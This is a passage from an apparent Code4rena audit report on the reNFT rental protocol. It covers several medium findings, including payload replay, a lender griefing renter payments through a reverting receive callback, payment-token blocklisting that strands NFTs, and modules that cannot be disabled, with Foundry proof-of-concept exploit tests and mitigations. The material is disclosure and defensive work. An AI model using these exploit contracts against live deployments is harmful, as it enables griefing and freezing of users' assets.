            if (rentalOrders[i].orderType == OrderType.PAY) {
                payRentalOrders[i / 2] = rentalOrders[i];
            }
        }

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);

        // renter stops the rental order
        vm.prank(dan.addr);
        stop.stopRentBatch(payRentalOrders);

        // for each rental order stopped, perform some assertions
        for (uint256 i = 0; i < payRentalOrders.length; i++) {
            // assert that the rental order doesnt exist in storage
            assertEq(STORE.orders(payRentalOrders[i].seaportOrderHash), false);

            // assert that the token is no longer rented out in storage
            assertEq(
                STORE.isRentedOut(
                    payRentalOrders[i].rentalWallet,
                    address(erc721s[0]),
                    i
                ),
                false
            );

            // assert that the ERC721 is back to its original owner
            assertEq(erc721s[0].ownerOf(i), address(offerers[i].addr));

            // assert that each offerer made a payment
            assertEq(erc20s[0].balanceOf(offerers[i].addr), uint256(9900));
        }

        // assert that the payments were pulled from the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));

        // assert that the fulfiller was paid for each order
        assertEq(erc20s[0].balanceOf(dan.addr), uint256(10300));
    }
```

</details>

You may find out that all `extraData` are same although the rental orders are created by different lenders.

### Recommended Mitigation Steps

Introduces a field into `RentPayload` to ensure every `payload` unique. It is feasible using `orderHash` of the rental order:

```solidity
struct RentPayload {
    bytes32 orderHash;
    OrderFulfillment fulfillment;
    OrderMetadata metadata;
    uint256 expiration;
    address intendedFulfiller;
}
```

**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-renft-findings/issues/162#issuecomment-1913718038)**

**[Alec1017 (reNFT) confirmed via duplicate #239](https://github.com/code-423n4/2024-01-renft-findings/issues/239#issuecomment-1908739770)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/10) - Prevents `RentPayload` replayability and ensures that orders must be unique by disallowing partial orders from seaport.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/19), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/65) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/60).

***

## [[M-14] Lender of a PAY order lending can grief renter of the payment](https://github.com/code-423n4/2024-01-renft-findings/issues/65)
*Submitted by [stackachu](https://github.com/code-423n4/2024-01-renft-findings/issues/65), also found by [EV\_om](https://github.com/code-423n4/2024-01-renft-findings/issues/634), [lanrebayode77](https://github.com/code-423n4/2024-01-renft-findings/issues/615), [CipherSleuths](https://github.com/code-423n4/2024-01-renft-findings/issues/567), [0xc695](https://github.com/code-423n4/2024-01-renft-findings/issues/547), rbserver ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/449), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/426)), [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/448), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/388), [jasonxiale](https://github.com/code-423n4/2024-01-renft-findings/issues/379), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/351), [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/343), [0xA5DF](https://github.com/code-423n4/2024-01-renft-findings/issues/315), [0xDING99YA](https://github.com/code-423n4/2024-01-renft-findings/issues/255), [HSP](https://github.com/code-423n4/2024-01-renft-findings/issues/231), [kaden](https://github.com/code-423n4/2024-01-renft-findings/issues/129), and [cccz](https://github.com/code-423n4/2024-01-renft-findings/issues/78)*

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43>

In a PAY order lending, the renter is payed by the lender to rent the NFT. When the rent is stopped, [`Stop.stopRent()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265), transfers the NFT from the renter's Safe back to the lender and transfers the payment to the renter.

To transfer the NFT from the Safe, [`_reclaimRentedItems()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166) is used, which makes the Safe contract execute a delegatecall to `Stop.reclaimRentalOrder()`, which is inherited from [`Reclaimer.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71). This function uses [`ERC721.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33) or [`ERC1155.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43) to transfer the the NFT.

If the recipient of the NFT (the lender's wallet) is a smart contract, the `safeTransferFrom()` functions will call the `onERC721Received()` or `onERC1155BatchReceived()` callback on the lender's wallet. If those functions don't return the corresponding magic bytes4 value or revert, the transfer will revert. In this case stopping the rental will fail, the NFT will still be in the renter's wallet and the payment will stay in the payment escrow contract.

### Impact

A malicious lender can use this vulnerability to grief a PAY order renter of their payment by having the  `onERC721Received()` or `onERC1155BatchReceived()` callback function revert or not return the magic bytes4 value. They will need to give up the lent out NFT in return which will be stuck in the renter's Safe (and usable for the renter within the limitations of the rental Safe).

However, the lender has the ability to release the NFT and payment anytime by making the callback function revert conditional on some parameter that they can set in their contract. This allows them to hold the renter's payment for ransom and making the release conditional on e.g. a payment from the renter to the lender. The lender has no risk here, as they can release their NFT at any time.

### Proof of Concept

Add the following code to [`StopRent.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRent.t.sol):

<details>

```diff
diff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol
index 3d19d3c..551a1b6 100644
--- a/test/integration/StopRent.t.sol
+++ b/test/integration/StopRent.t.sol
@@ -7,6 +7,49 @@ import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStruct

 import {BaseTest} from "@test/BaseTest.sol";

+import {Errors} from "@src/libraries/Errors.sol";
+import {IERC721} from "@openzeppelin-contracts/token/ERC721/IERC721.sol";
+import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+contract BadWallet {
+  bool receiveEnabled = true;
+  address owner = msg.sender;
+
+  // To enable EIP-1271.
+  // Normally isValidSignature actually validates if the signature is valid and from the owner.
+  // This is not relevant to the PoC, so we just validate anything here.
+  function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
+    return this.isValidSignature.selector;
+  }
+
+  function doApproveNFT(address target, address spender) external {
+    require(msg.sender == owner);
+    IERC721(target).setApprovalForAll(spender, true);
+  }
+
+  function doApproveERC20(address target, address spender, uint256 amount) external {
+    require(msg.sender == owner);
+    IERC20(target).approve(spender, amount);
+  }
+
+  function setReceiveEnabled(bool status) external {
+    require(msg.sender == owner);
+    receiveEnabled = status;
+  }
+
+  function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+  ) external view returns (bytes4) {
+    if (receiveEnabled)
+      return this.onERC721Received.selector;
+    else
+      revert("Nope");
+  }
+}
+
 contract TestStopRent is BaseTest {
     function test_StopRent_BaseOrder() public {
         // create a BASE order
```
</details>

Add the following test to `StopRent.t.sol`:

<details>

```solidity
    function test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed() public {
        vm.startPrank(alice.addr);
        BadWallet badWallet = new BadWallet();
        erc20s[0].transfer(address(badWallet), 100);
        badWallet.doApproveNFT(address(erc721s[0]), address(conduit));
        badWallet.doApproveERC20(address(erc20s[0]), address(conduit), 100);
        vm.stopPrank();
        // Alice's key will be used for signing, but the newly create SC wallet will be used as her address
        address aliceAddr = alice.addr;
        alice.addr = address(badWallet);

        // create a PAY order
        // this will mint the NFT to alice.addr
        createOrder({
            offerer: alice,
            orderType: OrderType.PAY,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 1,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 0
        });

        // finalize the pay order creation
        (
            Order memory payOrder,
            bytes32 payOrderHash,
            OrderMetadata memory payOrderMetadata
        ) = finalizeOrder();

        // create a PAYEE order. The fulfiller will be the offerer.
        createOrder({
            offerer: bob,
            orderType: OrderType.PAYEE,
            erc721Offers: 0,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 1,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the pay order creation
        (
            Order memory payeeOrder,
            bytes32 payeeOrderHash,
            OrderMetadata memory payeeOrderMetadata
        ) = finalizeOrder();
    
        // Ensure that ERC721.safeTransferFrom to the wallet now reverts
        vm.prank(aliceAddr);
        badWallet.setReceiveEnabled(false);
  
        // create an order fulfillment for the pay order
        createOrderFulfillment({
            _fulfiller: bob,
            order: payOrder,
            orderHash: payOrderHash,
            metadata: payOrderMetadata
        });
  
        // create an order fulfillment for the payee order
        createOrderFulfillment({
            _fulfiller: bob,
            order: payeeOrder,
            orderHash: payeeOrderHash,
            metadata: payeeOrderMetadata
        });
    
        // add an amendment to include the seaport fulfillment structs
        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});

        // finalize the order pay/payee order fulfillment
        (RentalOrder memory payRentalOrder, ) = finalizePayOrderFulfillment();

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);

        // try to stop the rental order
        vm.prank(bob.addr);
        vm.expectRevert(Errors.StopPolicy_ReclaimFailed.selector);
        stop.stopRent(payRentalOrder);

        // get the rental order hashes
        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);

        // assert that the rental order still exists in storage
        assertEq(STORE.orders(payRentalOrderHash), true);

        // assert that the token is still rented out in storage
        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);

        // assert that the ERC721 is still in the Safe
        assertEq(erc721s[0].ownerOf(0), address(bob.safe));

        // assert that the offerer made a payment
        assertEq(erc20s[0].balanceOf(aliceAddr), uint256(9900));

        // assert that the fulfiller did not received the payment
        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10000));

        // assert that a payment was not pulled from the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));
    }
```

</details>

Now the PoC can be run with:

    forge test --match-path test/integration/StopRent.t.sol --match-test test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed -vvv

### Recommended Mitigation Steps

I see three ways to mitigate this (however, the third one is incomplete):

*   Split stopping the rental and transferring the assets into separate steps, so that after stopping the rental, the lender and the renter have to call separate functions to claim their assets.
*   Change `Stop._reclaimRentedItems()` so that it doesn't revert when the transfer is unsuccessful.
*   For ERC721 use `ERC721.transferFrom()` instead of `ERC721.safeTransferFrom()` to transfer the NFT back to the lender. I believe it is reasonable to assume that the wallet that was suitable to hold a ERC721 before the rental is still suitable to hold a ERC721 after the rental and the `onERC721Received` check is not necessary in this case. For ERC1155 this mitigation cannot be used because ERC1155 only has a `safeTransferFrom()` function that always does the receive check. So this mitigation is incomplete.


**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1908313192)**

**[JCN (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1916120705):**
 > Hi @0xean ,
> 
> It seems [Issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) also identifies the same root cause as this issue: A lender can implement a malicious callback to DOS the `stop` calls. 
> 
> However, this issue does not demonstrate a freezing of victim (renter) "owned" assets. In this issue the lender (attacker) is allowing their NFT and rental payment to be frozen in order to grief the victim. However, I would argue that the victim is not impacted in a way that warrants a `high` severity. Although the victim can not receive the proposed rental payment, they will essentially be able to utilize the rented NFT while the lender is "griefing" them. The renter is only losing "theoretical capital" in this situation (i.e. the rental payment, which was supplied by the attacker), but would be gaining access to the rented NFT for additional time.
> 
> Meanwhile, [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) has identified how to leverage the root cause in this issue with another bug (`safe wallet can't differentiate between non-rented and rented ERC1155 tokens`) in order to permanently freeze a victim's ERC1155 tokens in their safe wallet. 
> 
> Given the information above, can you please provide the rationale behind labeling this issue (and duplicates) as `high` severity, while labeling [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) (and duplicates) as `medium` severity? Based on my observations it seems this issue (and duplicates) should be of `medium` severity. However, if its `high` severity status is maintained, then I would think that [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) (and its duplicates) should be of `high` severity as well since these issues demonstrate a greater impact. 
> 
> I appreciate you taking the time to read my comment. 

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1916974749):**
 > @0xJCN thanks for the comment. 
> 
> I have re-read the impact and better understand this issue as a result.  I do not agree that this loss is "theoretical", a withheld payment is not theoretical, however it is temporary if the lender has any intention to ever receive back their NFT and therefore since its temporary and not a complete loss I do think M is more appropriate.

_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/65)._

***

## [[M-15]  Blocklisting in payment ERC20 can cause rented NFT to be stuck in Safe](https://github.com/code-423n4/2024-01-renft-findings/issues/64)
*Submitted by [stackachu](https://github.com/code-423n4/2024-01-renft-findings/issues/64), also found by [albertwh1te](https://github.com/code-423n4/2024-01-renft-findings/issues/638), [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/632), [EV\_om](https://github.com/code-423n4/2024-01-renft-findings/issues/628), [sin1st3r\_\_](https://github.com/code-423n4/2024-01-renft-findings/issues/605), [0xc695](https://github.com/code-423n4/2024-01-renft-findings/issues/550), [serial-coder](https://github.com/code-423n4/2024-01-renft-findings/issues/548), [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/471), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/425), [DeFiHackLabs](https://github.com/code-423n4/2024-01-renft-findings/issues/421), [krikolkk](https://github.com/code-423n4/2024-01-renft-findings/issues/374), [0xabhay](https://github.com/code-423n4/2024-01-renft-findings/issues/373), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/356), [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/344), [peanuts](https://github.com/code-423n4/2024-01-renft-findings/issues/295), [Krace](https://github.com/code-423n4/2024-01-renft-findings/issues/277), [lanrebayode77](https://github.com/code-423n4/2024-01-renft-findings/issues/268), [KupiaSec](https://github.com/code-423n4/2024-01-renft-findings/issues/264), [HSP](https://github.com/code-423n4/2024-01-renft-findings/issues/258), [said](https://github.com/code-423n4/2024-01-renft-findings/issues/206), [ladboy233](https://github.com/code-423n4/2024-01-renft-findings/issues/180), [J4X](https://github.com/code-423n4/2024-01-renft-findings/issues/160), [ZanyBonzy](https://github.com/code-423n4/2024-01-renft-findings/issues/159), [0xHelium](https://github.com/code-423n4/2024-01-renft-findings/issues/152), [peter](https://github.com/code-423n4/2024-01-renft-findings/issues/115), [0xpiken](https://github.com/code-423n4/2024-01-renft-findings/issues/113), [Qkite](https://github.com/code-423n4/2024-01-renft-findings/issues/112), [marqymarq10](https://github.com/code-423n4/2024-01-renft-findings/issues/95), [cccz](https://github.com/code-423n4/2024-01-renft-findings/issues/80), and [holydevoti0n](https://github.com/code-423n4/2024-01-renft-findings/issues/37)*

When a rental is stopped, [`Stop.stopRent()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265) transfers the rented NFT back from the renter's Safe to the lender's wallet and transfers the ERC20 payments from the payment escrow contract to the respective recipients (depending on the type of rental, those can be the renter, the lender, or both).

To transfer the ERC20 payments, [`PaymentEscrow.settlePayment()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L320) is called.

`PaymentEscrow.settlePayment()` will use [`_safeTransfer()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L100) (via `_settlePayment()` and `_settlePaymentProRata()` or `_settlePaymentInFull()`) to transfer the ERC20 payments to the recipients:

*   If the rental was a BASE order, the payment is sent to the lender.
*   If the rental was a PAY order and the rental period is over, the payment is sent to the renter.
*   If the rental was a PAY order and the rental period is not over, the payment is split between the lender and the renter.

If either the payment recipient or the payment escrow contract are blocklisted in the payment ERC20, the transfer will fail and `_safeTransfer()` will revert. In this case the rental is not stopped, the rented NFT will still be in the renter's Safe, and the payment will still be in the payment escrow contract.

Blocklisting is implemented by several stablecoins issued by centralized entities (e.g. USDC and USDT) to be able to comply with regulatory requirements (freeze funds that are connected to illegal activities).

There are multiple scenarios that can have impact here:

A. The renter of a PAY order rental is blocklisted: Even if the renter is already blocklisted before making the rental, the rental can still start, but ending the rental will not be possible, so the lender loses the rented NFT (it will be stuck in the Safe) and at least temporarily loses access to the payment (it will be stuck in the payment escrow, but a protocol admin could recover it).

B. The lender of a BASE order rental is blocklisted: Ending the rental will not be possible, so the lender loses the rented NFT and the payment. However, it is unlikely that the lender has been blocklisted arbitrarily during the rental or wasn't aware of the blocklisting before the rental, so this scenario seems unlikely.

C. The payment escrow contract becomes blocklisted during the rental (if it were blocklisted before the rental, the rental couldn't start): In this case the lender loses the rented NFT and the payment is lost. However, it seems unlikely that the payment escrow contract becomes blocklisted.

### Impact

Out of the scenarios listed above, scenario A has the highest impact. Anyone who is blocklisted by a ERC20 contract can grief any lender of a PAY order lending offer that offers this ERC20 as payment of their rental NFT. The attacker only has to pay the gas fee to start the rental to carry out this attack.

Scenarios B and C are less severe (due to low likelihood) but still relevant, as the blocklisting carried out in the external payment ERC20 contract causes the loss of the rental NFT.

### Proof of Concept

Add blocklisting to the [MockERC20 contract](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/mocks/tokens/standard/MockERC20.sol):

<details>

```diff
diff --git a/test/mocks/tokens/standard/MockERC20.sol b/test/mocks/tokens/standard/MockERC20.sol
index 3e170c1..abcfaf7 100644
--- a/test/mocks/tokens/standard/MockERC20.sol
+++ b/test/mocks/tokens/standard/MockERC20.sol
@@ -4,8 +4,26 @@ pragma solidity ^0.8.20;
 import {ERC20} from "@openzeppelin-contracts/token/ERC20/ERC20.sol";

 contract MockERC20 is ERC20 {
+    mapping(address => bool) public isBlocklisted;
+
     constructor() ERC20("MockERC20", "MERC20") {}

+    function setBlock(address account, bool status) public {
+        isBlocklisted[account] = status;
+    }
+
+    function transfer(address to, uint256 value) public override returns (bool) {
+        if (isBlocklisted[to] || isBlocklisted[msg.sender])
+          revert("You are blocked");
+        return super.transfer(to, value);
+    }
+
+    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
+        if (isBlocklisted[to] || isBlocklisted[from])
+          revert("You are blocked");
+        return super.transferFrom(from, to, value);
+    }
+
     function mint(address to, uint256 amount) public {
         _mint(to, amount);
     }
```

</details>

Add the following import to [`StopRent.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRent.t.sol):

```solidity
import {Errors} from "@src/libraries/Errors.sol";
```

Add the following test to `StopRent.t.sol`:

<Details>

```solidity
    function test_StopRent_PayOrder_InFull_StoppedByLender_RenterBlocklisted() public {
        // Blocklist the renter
        erc20s[0].setBlock(bob.addr, true);

        // create a PAY order
        createOrder({
            offerer: alice,
            orderType: OrderType.PAY,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 1,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 0
        });

        // finalize the pay order creation
        (
            Order memory payOrder,
            bytes32 payOrderHash,
            OrderMetadata memory payOrderMetadata
        ) = finalizeOrder();

        // create a PAYEE order. The fulfiller will be the offerer.
        createOrder({
            offerer: bob,
            orderType: OrderType.PAYEE,
            erc721Offers: 0,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 1,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the pay order creation
        (
            Order memory payeeOrder,
            bytes32 payeeOrderHash,
            OrderMetadata memory payeeOrderMetadata
        ) = finalizeOrder();

        // create an order fulfillment for the pay order
        createOrderFulfillment({
            _fulfiller: bob,
            order: payOrder,
            orderHash: payOrderHash,
            metadata: payOrderMetadata
        });

        // create an order fulfillment for the payee order
        createOrderFulfillment({
            _fulfiller: bob,
            order: payeeOrder,
            orderHash: payeeOrderHash,
            metadata: payeeOrderMetadata
        });

        // add an amendment to include the seaport fulfillment structs
        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});

        // finalize the order pay/payee order fulfillment
        (RentalOrder memory payRentalOrder, ) = finalizePayOrderFulfillment();

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);

        // try to stop the rental order (will revert)
        vm.prank(alice.addr);
        vm.expectRevert(
          abi.encodeWithSelector(
            Errors.PaymentEscrowModule_PaymentTransferFailed.selector,
            address(erc20s[0]),
            bob.addr,
            100
          )
        );
        stop.stopRent(payRentalOrder);

        // get the rental order hashes
        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);

        // assert that the rental order still exists in storage
        assertEq(STORE.orders(payRentalOrderHash), true);

        // assert that the token are still rented out in storage
        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);

        // assert that the ERC721 is still in the safe
        assertEq(erc721s[0].ownerOf(0), address(bob.safe));

        // assert that the offerer made a payment
        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));

        // assert that the fulfiller did not received the payment
        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10000));

        // assert that a payment is still in the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));
    }
```
</details>

Now the PoC can be run with:

    forge test --match-path test/integration/StopRent.t.sol --match-test test_StopRent_PayOrder_InFull_StoppedByLender_RenterBlocklisted -vvv

### Recommended Mitigation Steps

I see two ways to mitigate this:

*   Implement a non-reverting transfer helper function used for payments when stopping the rental. In case of blocklisting, the NFT would still be returned to the lender while the payment ERC20 stays in the payment escrow contract (but could be recovered by an admin unless the payment escrow contract itself is blocklisted).
*   Split stopping the rental and transferring the assets into separate steps, so that after stopping the rental, the lender and the renter have to call separate functions to claim their assets.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/64#issuecomment-1908303940)**

**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-renft-findings/issues/64#issuecomment-1913270795)**

***

## [[M-16] Blacklisted extensions can't be disabled for rental safes](https://github.com/code-423n4/2024-01-renft-findings/issues/43)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-01-renft-findings/issues/43), also found by [0xA5DF](https://github.com/code-423n4/2024-01-renft-findings/issues/651), [ZdravkoHr](https://github.com/code-423n4/2024-01-renft-findings/issues/650), [J4X](https://github.com/code-423n4/2024-01-renft-findings/issues/648), [AkshaySrivastav](https://github.com/code-423n4/2024-01-renft-findings/issues/479), [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/251), and [fnanni](https://github.com/code-423n4/2024-01-renft-findings/issues/238)*

Safe owners can enable modules on their safes only if those modules are whitelisted, this check is also done on disabling modules, which poses a problem. This guarding logic is handled in `_checkTransaction` in `Guard.sol`. If a module is whitelisted and a safe owner enables it on his safe, later protocol admins find out that the module has a serious bug and should be blacklisted so no more rental safes are affected, at this point the safe owner has no way of disabling that module as it is blacklisted, and his safe will be vulnerable to exploitation forever, putting all the safe's possessions at risk.

### Proof of Concept

<Details>

```solidity
function test_bug_CantDisableBlacklistedExtension() public {
    address EXTENSION_1 = TEST_ADDR_1;
    address EXTENSION_2 = TEST_ADDR_2;
    address bobSafe = address(bob.safe);

    // Extensions 1 and 2 are whitelisted
    vm.startPrank(deployer.addr);
    admin.toggleWhitelistExtension(EXTENSION_1, true);
    admin.toggleWhitelistExtension(EXTENSION_2, true);
    vm.stopPrank();

    assertTrue(STORE.whitelistedExtensions(EXTENSION_1));
    assertTrue(STORE.whitelistedExtensions(EXTENSION_2));

    // Bob enables the extensions on his safe
    vm.startPrank(bob.addr);
    bytes memory transactionSignature = SafeUtils.signTransaction(
        bobSafe,
        bob.privateKey,
        bobSafe,
        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_1)
    );
    SafeUtils.executeTransaction(
        bobSafe,
        bobSafe,
        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_1),
        transactionSignature
    );
    transactionSignature = SafeUtils.signTransaction(
        bobSafe,
        bob.privateKey,
        bobSafe,
        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_2)
    );
    SafeUtils.executeTransaction(
        bobSafe,
        bobSafe,
        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_2),
        transactionSignature
    );
    vm.stopPrank();

    assertTrue(ISafe(bobSafe).isModuleEnabled(EXTENSION_1));
    assertTrue(ISafe(bobSafe).isModuleEnabled(EXTENSION_2));

    // Extensions 1 and 2 are blacklisted
    vm.startPrank(deployer.addr);
    admin.toggleWhitelistExtension(EXTENSION_1, false);
    admin.toggleWhitelistExtension(EXTENSION_2, false);
    vm.stopPrank();

    assertFalse(STORE.whitelistedExtensions(EXTENSION_1));
    assertFalse(STORE.whitelistedExtensions(EXTENSION_2));

    // Bob tries to disable extension 1 on his safe, reverts as it is blacklisted
    vm.startPrank(bob.addr);
    transactionSignature = SafeUtils.signTransaction(
        bobSafe,
        bob.privateKey,
        bobSafe,
        abi.encodeWithSelector(ISafe.disableModule.selector, EXTENSION_2, EXTENSION_1)
    );
    vm.expectRevert();
    SafeUtils.executeTransaction(
        bobSafe,
        bobSafe,
        abi.encodeWithSelector(
            ISafe.disableModule.selector,
            EXTENSION_2,
            EXTENSION_1
        ),
        transactionSignature
    );
    vm.stopPrank();
}
```
</details>

### Tools Used

VSCode

### Recommended Mitigation Steps

Allow users to disable any module without looking if it's whitelisted or not but with having a list of modules that can't be disabled that should contain the stop policy.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/43#issuecomment-1908291416)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/15) - Introduces more granular controls over whitelist for extensions.

**Status:** Unmitigated. Full details in report from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20), and also included in the [Mitigation Review](#mitigation-review) section below.

***

# Low Risk and Non-Critical Issues

For this audit, 28 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-01-renft-findings/issues/330) by **0xA5DF** received the top score from the judge.

*The following wardens also submitted reports: [SBSecurity](https://github.com/code-423n4/2024-01-renft-findings/issues/604), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/455), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/398), [AkshaySrivastav](https://github.com/code-423n4/2024-01-renft-findings/issues/293), [ZanyBonzy](https://github.com/code-423n4/2024-01-renft-findings/issues/135), [ladboy233](https://github.com/code-423n4/2024-01-renft-findings/issues/94), [0xmystery](https://github.com/code-423n4/2024-01-renft-findings/issues/607), [plasmablocks](https://github.com/code-423n4/2024-01-renft-findings/issues/577), [kaden](https://github.com/code-423n4/2024-01-renft-findings/issues/541), [CipherSleuths](https://github.com/code-423n4/2024-01-renft-findings/issues/536), [jasonxiale](https://github.com/code-423n4/2024-01-renft-findings/issues/484), [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/477), [peanuts](https://github.com/code-423n4/2024-01-renft-findings/issues/469), [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/361), [7ashraf](https://github.com/code-423n4/2024-01-renft-findings/issues/334), [krikolkk](https://github.com/code-423n4/2024-01-renft-findings/issues/322), [NentoR](https://github.com/code-423n4/2024-01-renft-findings/issues/321), [ZdravkoHr](https://github.com/code-423n4/2024-01-renft-findings/issues/297), [pkqs90](https://github.com/code-423n4/2024-01-renft-findings/issues/290), [invitedtea](https://github.com/code-423n4/2024-01-renft-findings/issues/219), [dd0x7e8](https://github.com/code-423n4/2024-01-renft-findings/issues/208), [Tendency](https://github.com/code-423n4/2024-01-renft-findings/issues/175), [souilos](https://github.com/code-423n4/2024-01-renft-findings/issues/157), [rokinot](https://github.com/code-423n4/2024-01-renft-findings/issues/145), [haxatron](https://github.com/code-423n4/2024-01-renft-findings/issues/136), [ravikiranweb3](https://github.com/code-423n4/2024-01-renft-findings/issues/48), and [petro\_1912](https://github.com/code-423n4/2024-01-renft-findings/issues/40).*

## [L-01] - `Factory.deployRentalSafe()` can be front-run to revert safe creation

Consider the following scenario:
* A user sends out a tx to call `Factory.deployRentalSafe()`
* The attacker sees that and front runs it, calling `SafeProxyFactory.createProxyWithNonce()` directly with the same parameters
* The user's tx would revert because the safe already exists

The user can mitigate that by first creating a safe with a different set or order of owners, or a different threshold, and then creating the safe they wished to create (the attacker can still keep front-running those txs though).

A way to mitigate that (prevent front running) is to deploy a fork of `SafeProxyFactory` with access control - allowing only the protocol's Factory to create new safes.

## [L-02] - Initializer can be front run
Both modules are using a proxy with initializers, those initializers can be front run during deployment.
As mitigation - ensure that initialization runs at the same tx with deployment.

## [L-03] - On transaction hooks aren’t controlled by the lender
